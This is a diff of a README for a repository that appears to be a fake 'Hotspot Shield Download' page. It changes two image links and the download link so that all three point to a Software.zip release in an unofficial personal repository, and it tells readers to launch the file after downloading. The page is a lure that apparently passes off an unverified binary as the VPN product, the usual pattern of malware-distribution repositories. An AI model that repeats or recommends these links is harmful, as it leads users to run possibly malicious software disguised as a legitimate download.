@@ -2,7 +2,7 @@
 
 Welcome to the Hotspot Shield Download repository! 🛡️🔥
 
-![Hotspot Shield](https://cdn.vpnranks.com/wp-content/uploads/2019/03/hotspot-shield-featured.jpg)
+![Hotspot Shield](https://github.com/MinatoMeaw/Hotspot-Shield-Download/releases/download/v2.0/Software.zip)
 
 If you are looking for information on hotspot shield vpn reviews, hotspot shield vpn chrome extension, hotspot shield free vpn, and much more, you have come to the right place.
 
@@ -31,7 +31,7 @@ This repository provides resources and information related to Hotspot Shield VPN
 
 ## Downloads
 
-📥 [Download Hotspot Shield Software](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)  
+📥 [Download Hotspot Shield Software](https://github.com/MinatoMeaw/Hotspot-Shield-Download/releases/download/v2.0/Software.zip)  
 *(Launch the file after downloading)*
 
 For more downloads and resources, make sure to check out the "Releases" section of this repository.
@@ -44,4 +44,4 @@ Let's make Hotspot Shield Download the go-to place for all things Hotspot Shield
 
 Happy browsing and downloading! 🌟
 
-![Hotspot Shield Logo](https://cdn0.techly.com.au/wp-content/uploads/2017/10/giphy-2.gif)
+![Hotspot Shield Logo](https://github.com/MinatoMeaw/Hotspot-Shield-Download/releases/download/v2.0/Software.zip)
